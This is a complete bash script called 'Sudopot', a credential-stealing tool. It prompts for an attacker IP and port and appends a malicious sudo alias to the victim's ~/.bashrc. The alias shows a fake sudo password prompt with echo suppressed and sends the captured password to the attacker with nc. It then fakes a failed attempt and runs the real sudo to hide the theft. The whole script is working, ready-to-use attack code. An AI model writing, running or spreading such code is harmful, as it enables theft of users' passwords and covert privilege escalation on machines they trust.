#!/bin/bash
echo 'Welcome to Sudopot version 0.3 by Barak Tawily aka Quitten and Yuval tisf Nativ'
echo "Target Username: $(whoami)"
echo "Please enter attacker ip adress:"
read ip
echo "Port:"
read port
echo 'Open files and injecting code...'
echo '0' > .hon
CURRENT=`pwd`

echo "alias sudo='aa=\$(cat $CURRENT/.hon);if [ \$aa == \"0\" ]; then echo -en \"[sudo] password for \$(whoami):\r\n\";stty -echo;read pss;echo \$pss | nc $ip $port;echo \"1\" > $CURRENT/.hon;sleep 2; echo -en \"Sorry, try again.\r\n\";echo -en \"[sudo] password for $(whoami):\r\n\";read;eval \"sudo \$sudo\";echo \"0\" > $CURRENT/.hon;stty sane;fi;'" >> ~/.bashrc
echo 'Code injected.'
echo -e "Please open a nc listner, sudo nc -l $ip $port\r\nHave fun while waiting...\r\nSudopot done, bye bye"
